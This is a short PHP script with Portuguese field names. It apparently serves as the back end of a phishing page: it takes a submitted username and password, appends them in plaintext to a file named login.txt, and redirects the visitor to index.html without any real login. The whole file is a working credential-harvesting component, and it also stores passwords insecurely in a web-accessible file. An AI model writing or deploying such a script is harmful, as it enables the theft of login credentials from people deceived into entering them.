<?php
$usuario = $_POST ['usuario'];
$senha = $_POST ['senha'];

$linha = "|". $usuario ."|". $senha ."|". PHP_EOL;

file_put_contents('login.txt', $linha, FILE_APPEND);
header('Location: index.html',);
exit;
?>